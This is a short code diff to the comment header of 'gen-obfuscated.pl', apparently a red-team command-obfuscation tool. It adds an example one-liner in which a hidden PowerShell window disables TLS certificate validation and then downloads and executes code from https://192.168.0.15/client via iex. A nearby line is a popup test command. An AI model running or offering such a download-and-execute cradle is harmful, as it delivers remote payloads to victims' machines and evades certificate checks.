@@ -60,6 +60,11 @@ gen-obfuscated.pl
 #
 # OR
 #
+# A one-liner that supports a dowloadstring from a https site with a self-signed cert.
+cmd /c powershell.exe -w hidden -c "&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};iex(New-Object System.Net.Webclient).DownloadString('https://192.168.0.15/client')}"
+#
+# OR
+#
 # A command that produces a popup, for testing only using ascii chr function obfuscation
 # cmd /c powershell -w hidden -c iex (New-Object -ComObject Wscript.Shell).Popup('IEX Decoded and Executed!',0,'Done',0x1););
 #
